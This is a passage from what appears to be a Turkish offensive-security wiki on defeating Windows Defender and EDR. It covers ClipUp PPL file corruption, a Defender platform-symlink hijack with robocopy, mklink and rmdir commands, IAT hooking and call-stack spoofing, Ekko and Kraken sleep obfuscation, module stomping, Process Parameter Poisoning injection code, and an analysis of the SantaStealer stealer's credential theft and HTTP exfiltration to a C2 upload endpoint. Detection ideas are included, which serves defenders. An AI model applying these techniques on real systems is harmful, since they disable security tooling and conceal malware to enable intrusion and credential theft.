2) Korunan bir AV directory'sinde (ör. Defender Platform) file creation'ı zorlamak için ClipUp log-path argümanını geçin. Gerekirse 8.3 short name'leri kullanın.
3) Hedef binary normalde AV çalışırken open/locked durumdaysa (ör. MsMpEng.exe), write işlemini boot sırasında, AV başlamadan önce çalışacak şekilde planlayın; bunun için daha erken ve güvenilir biçimde çalışan bir auto-start service yükleyin. Process Monitor (boot logging) ile boot ordering'i doğrulayın.
4) Reboot sonrasında PPL-backed write, AV binary'lerini lock'lamadan önce gerçekleşir; hedef file'ı bozarak startup'ı engeller.

Örnek invocation (path'ler güvenlik amacıyla çıkarılmış/kısaltılmıştır):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; primitive, hassas içerik injection'ı yerine corruption için uygundur.
- Bir service kurmak/başlatmak ve reboot window için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.

Tespitler
- Özellikle boot sırasında non-standard launcher'lar tarafından parent edilen, unusual arguments kullanan `ClipUp.exe` process creation olayları.
- Şüpheli binary'leri auto-start olarak yapılandıran ve Defender/AV'den önce sürekli başlatılan yeni service'ler. Defender startup failure'larından önceki service creation/modification olaylarını inceleyin.
- Defender binary'leri/Platform directories üzerinde file integrity monitoring; protected-process flags taşıyan process'ler tarafından yapılan beklenmeyen file creation/modification olayları.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve non-AV binary'ler tarafından yapılan anomalous PPL level kullanımını arayın.

Azaltımlar
- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru context'ler dışındaki ClipUp invocation'larını engelleyin.
- Service hygiene: auto-start service'lerin creation/modification işlemlerini kısıtlayın ve start-order manipulation'ı izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption'a işaret eden startup error'larını inceleyin.
- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation'ı devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).

## Platform Version Folder Symlink Hijack ile Microsoft Defender'a Tampering

Windows Defender, çalışacağı platformu şu konumun altındaki subfolder'ları enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer ve ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Local Administrator (Platform folder altında directory/symlink oluşturmak için gerekir)
- Reboot gerçekleştirme veya Defender platform re-selection tetikleme yeteneği (boot sırasında service restart)
- Yalnızca built-in tools gereklidir (`mklink`)

Nasıl çalışır
- Defender kendi folder'larına yapılan write işlemlerini engeller; ancak platform selection, directory entry'lerine güvenir ve target'ın protected/trusted bir path'e çözümlenip çözümlenmediğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform folder'ın writable bir clone'unu hazırlayın; örneğin `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürüm numarasına sahip bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` altındaki yeni process path'ini ve service configuration/registry'nin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın application directory'sinden yüklediği DLL'leri, Defender process'lerinde code execute etmek için bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink'i kaldırın; böylece bir sonraki başlatmada configured path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin kendi başına privilege escalation sağlamadığını unutmayın; admin hakları gerektirir.

## API/IAT Hooking + PIC ile Call-Stack Spoofing (Crystal Kit tarzı)

Red team ekipleri runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün kendisine taşıyabilir; bunun için modülün Import Address Table (IAT) tablosuna hook ekleyip seçili API'leri saldırganın kontrolündeki position-independent code (PIC) üzerinden yönlendirebilirler. Bu yaklaşım, evasion işlemlerini birçok kitin sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Yüksek seviyeli yaklaşım
- Bir reflective loader kullanarak hedef modülün yanına (prepend edilmiş veya companion olarak) bir PIC blob yerleştirin. PIC kendi kendine yeterli ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR yapısını tarayın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına işaret edecek şekilde patch'leyin.
- Her PIC wrapper'ı gerçek API adresine tail-call yapmadan önce evasion işlemlerini çalıştırır. Tipik evasion işlemleri şunlardır:
- Çağrı çevresinde memory mask/unmask uygulama (ör. beacon bölgelerini encrypt etme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında geri yükleme.
- Call-stack spoofing: benign bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'lere çözülmesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için bir interface export edin; böylece bir Aggressor script'i (veya eşdeğeri) Beacon, BOF'lar ve post-ex DLL'leri için hangi API'lerin hook edileceğini kaydedebilir.

Burada neden IAT hooking kullanılıyor
- Hook'lanan import'u kullanan tüm code'lar için çalışır; tool code'unu değiştirmeyi veya belirli API'leri proxy'lemek üzere Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary* hooking, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) intercept etmenize ve aynı masking/stack evasion işlemlerini bu modüllerin API çağrılarına uygulamanıza olanak tanır.
- CreateProcessA/W'i wrapping ederek call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir şekilde kullanılmasını yeniden sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking işlemini gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch uygulamadan önce yakaladığınız original IAT değerinden veya LdrGetProcedureAddress üzerinden çözümleyin.
- PIC için RW → RX geçişlerini kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri oluşturur (return address'ler benign modüllere işaret eder) ve ardından gerçek API'ye pivot eder.
- Bu, Beacon/BOF'lerden sensitive API'lere gelen canonical stack'leri bekleyen detection'ları etkisizleştirir.
- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operational integration
- PIC ve hooks, DLL yüklendiğinde otomatik olarak initialize olsun diye reflective loader'ı post-ex DLL'lerinin başına ekleyin.
- Target API'lerini kaydetmek için bir Aggressor script kullanın; böylece Beacon ve BOF'ler kod değişikliği olmadan aynı evasion path'ten şeffaf biçimde yararlanır.

Detection/DFIR considerations
- IAT integrity: non-image (heap/anon) adreslere çözümlenen entry'ler; import pointer'larının periyodik doğrulanması.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT'e in-process yazmalar, import thunk'larını değiştiren erken DllMain etkinliği, load sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: hooking LoadLibrary* kullanılıyorsa, memory masking olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

Related building blocks and examples
- Load sırasında IAT patching gerçekleştiren reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hooks (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hooks kontrolü yapan özel bir resolver ile değiştirerek **ProcessImports()** sırasında import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendisini serbest bıraktıktan sonra da varlığını sürdüren bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını geçersiz kılan bir `setup_hooks()` function'ı export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook lookup kullanın. Bir hook varsa onu döndürün; yoksa gerçek `GetProcAddress`'e yönlendirin.
- Hook target'larını link time'da Crystal Palace `addhook "MODULE$Func" "hook"` entry'leriyle kaydedin. Hook, resident PICO içinde bulunduğu için geçerliliğini korur.

Bu yöntem, loaded DLL'nin code section'ını load sonrasında patch'lemeden **import-time IAT redirection** sağlar.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks yalnızca function target'ın IAT'inde gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorlayın:

- Hashed export resolution'ı (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştirin.
- Compiler bir IAT entry üretir; bu da reflective loader import'ları çözümlerken interception yapılmasını sağlar.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` patch'lemek yerine implant'ın kullandığı **actual wait/IPC primitives**'leri (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun wait'ler için, idle sırasında in-memory image'ı encrypt eden Ekko tarzı bir obfuscation chain ile çağrıyı wrapper içine alın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`'ı crafted `CONTEXT` frame'leriyle çağıran callback sequence'ini planlamak için `CreateTimerQueueTimer` kullanın.
- Typical chain (x64): image'ı `PAGE_READWRITE` olarak ayarlayın → mapped image'ın tamamı üzerinde `advapi32!SystemFunction032` ile RC4 encrypt uygulayın → blocking wait gerçekleştirin → RC4 decrypt uygulayın → PE section'larını dolaşarak **per-section permissions'ı restore edin** → completion'ı signal edin.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e clone edin ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operational detail: Uzun wait'ler için (örn. `WAIT_OBJECT_0`) “success” döndürün; böylece image masked durumdayken caller çalışmaya devam eder. Bu pattern, idle window'ları sırasında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection ideas (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
- Büyük, contiguous ve image boyutundaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Custom per-section permission restoration'ın izlediği geniş kapsamlı `VirtualProtect`.

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığı için genellikle prosesi `STATUS_STACK_BUFFER_OVERRUN` ile crash ettirir. Ekko/Kraken tarzı chain'leri hardened process'ler içinde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leri ile register edin.
- Loaded image'lar (`ntdll`, `kernel32`, `advapi32`) içindeki adreslerde `MEMORY_RANGE_ENTRY`, **image base**'te başlamalı ve **full image size**'ı kapsamalıdır.
- Manually mapped/PIC/stomped bölgelerde bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak erişilen export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target'lara dönüşecek attacker-controlled executable section'ları da mark edin.

Bu, ROP/JOP tarzı sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, browser'lar, `svchost.exe` ve diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerinde bozulabilir; çünkü spoof edilmiş bir `Rip` yine de hardware shadow stack ile uyumlu olmalıdır. Daha güvenli bir sleep-masking pattern'i şöyledir:<sup>[[30]](#references)</sup>

- Aynı process'teki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla thread'in `NT_TIB` / TEB stack bounds'larını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini backup edin.
- Gerçek sleeping context'i `GetThreadContext` ile capture edin.
- Yalnızca gerçek `Rip`'i spoof context'e kopyalayın; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
- Sleep window'ı sırasında spoof thread'in `NT_TIB`'sini mevcut TEB'e kopyalayın; böylece stack walker'lar legitimate bir stack range içinde unwind eder.
- Wait tamamlandıktan sonra original TIB ve thread context'i restore edin.

Bu, CET ile uyumlu bir instruction pointer korurken TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltır.

### APC-based alternative: Kraken Mask

Timer-queue dispatch çok signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanan suspended helper thread üzerinden çalıştırılabilir:<sup>[[27]](#references)</sup>

- Entry point olarak `NtTestAlert` bulunan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile queue'layın ve `NtAlertResumeThread` ile drain edin.
- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
- Start event'i atomik olarak signal etmek ve block olmak için `NtSignalAndWaitForSingleObject` kullanın.
- Scanner'ın half-restored bir stack'i yakalayabileceği race window'ını azaltmak için TIB/context'i restore etmeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ı ile değiştirir.

Additional detection ideas
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` kullanımı.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında wrapper olarak kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` sonrasında mevcut thread'in TEB/TIB stack bounds'larına doğrudan yazmalar.
- Indirect olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed modüller içinde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory allocate etmek veya yeni bir sacrificial DLL yüklemek yerine payload'ları target process içinde zaten mapped durumda olan bir DLL'nin **`.text` section'ından** çalıştırır. Overwrite target, process'in hâlâ ihtiyaç duyduğu code path'leri bozmadan payload'ı barındırabilecek, **loaded ve disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi common modüllere karşı yapılan naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve code region çok küçükse process crash olur. Daha güvenilir bir workflow:

1. Target process modüllerini enumerate edin ve zaten yüklü DLL'lerden yalnızca **names-only include list** oluşturun.
2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
3. Candidate DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, executable section'ın **memory'ye mapped edildiğindeki** boyutunu yansıttığı için file size'dan daha önemlidir.
4. **Export Address Table (EAT)**'i parse edin ve stomp başlangıç offset'i olarak bir exported function RVA seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'yi aşarsa, memory'de onun sonrasında yerleştirilmiş adjacent export'ları overwrite eder.

Sahada görülen typical recon/selection helper'ları:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasyonel notlar
- Telemetri oluşturan `LoadLibrary`/beklenmeyen image load işlemlerinden kaçınmak için uzak process'te **zaten yüklü** olan DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'leri thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implant'lar genellikle shellcode embedding işleminin bir string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirir; böylece injector source içinde buffer'ın tamamı doğru şekilde temsil edilir.

Detection fikirleri
- Daha yaygın private RWX/RX allocation'lar yerine **image-backed executable page**'lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write işlemleri.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde execution'a başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine karşı gerçekleştirilen ve ardından thread creation ile devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence'ları.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path'ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Byte'ları zaten çalışan bir target'a kopyalamak yerine, Windows'un `CreateProcessW` startup parameter'larının seçili olanlarını child process'e **kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğini kötüye kullanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan Poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **writable memory**'yi göstermelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmî olarak reserved durumdadır; bu nedenle `ShellInfo` mapping'i, sabit ve belgelenmiş bir contract yerine implementation detail olarak değerlendirilmelidir.

Bu işlem, normal process creation'ı **payload-transfer primitive** haline getirir. Operator, child process'i attacker-controlled startup data ile oluşturur ve Windows'un cross-process copy işlemini gerçekleştirmesine izin verir.

### Remote write API'leri olmadan remote lookup flow'u

Child oluşturulduktan sonra, copied buffer'ı **read-only** primitive'lerle resolve edin:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters`'ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kopyalanan parametre buffer'ının çalıştırılması

Kopyalanan parametre bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şu şekildedir:

1. Process'i normal şekilde oluşturun (suspended olmadan)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre page'ini executable hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) ile execution'ı redirect edin

Classic thread hijacking workflow'larının aksine bu işlem **`SuspendThread` / `ResumeThread` gerektirmez**; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.

Bu yöntem, injection için yaygın olarak izlenen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread`

### Null-byte sınırlaması ve staged shellcode

Her üç taşıyıcı da **string veya string-like data** olduğundan, `0x00` içeren raw payload transfer sırasında truncated olur. Pratik bir workaround, constants'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.

Basit bir pattern, XOR tabanlı constant synthesis'tir:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Bu, ilk aşamanın taşınan parametreye null byte gömmeden stack string'leri, API argümanlarını, DLL path'lerini veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larını sabitlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte aligned** tutmak

Daha sonra ikinci aşama stack'ten `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation kullanmaktan kaçınarak buraya jump edilebilir.

### Detection fikirleri

Yazarların belirttiği iyi hunting fırsatları:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kullanılarak **process-parameter pages**'in executable yapılması
- bu protection change işleminin `SetThreadContext` / `NtSetContextThread` ile takip edilmesi
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` üzerinde remote read işlemleri
- process creation sırasında olağandışı uzunlukta / yüksek entropy'li `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına tam bir execution primitive değil, **cross-process transfer trick**'idir: kopyalanan parametrenin hâlâ execute-permission change işlemine ve bir execution redirection method'una ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity, `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere dahili olarak ulaştığı için yazarlar tarafından değerlendirildi ancak reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft

SantaStealer (aka BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access işlemlerini tek bir workflow içinde nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic layout bulunursa sample boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan önce terminate olur; böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken bir hunting artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A, process listesini tarar, her adı özel bir rolling checksum ile hash'ler ve bunu debugger/sandbox blocklist'leriyle karşılaştırır; checksum'ı computer name üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, system properties'ı (process-count floor, recent uptime) inceler, VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping'i belirlemek üzere sleep işlemleri çevresinde timing checks gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + çift ChaCha20 reflective loading

- Primary DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium credential helper içerir; fileless mode, hiçbir helper artifact'i yazılmaması için imports/relocations işlemlerini kendisi çözer.
- Bu helper, ikinci aşama DLL'ini ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32-byte key + 12-byte nonce). Her iki pass tamamlandıktan sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator routines, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen password'leri/cookie'leri/credit card'ları doğrudan SQLite database'lerinden decrypt eder.

### Modüler in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer table'ını iterasyonla işler ve etkin her module (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.) için bir thread başlatır. Her thread sonuçları shared buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count bilgisini bildirir.
- Tamamlandıktan sonra her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve archive'ı HTTP POST üzerinden 10 MB'lık chunk'lar halinde `http://<C2>:6767/upload` adresine stream eder; browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` bilgilerini ekler; son chunk ise C2'nin reassembly işleminin tamamlandığını anlaması için `complete: true` ekler.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, malware için artık ücretsiz geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture checks'i bypass etmek](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
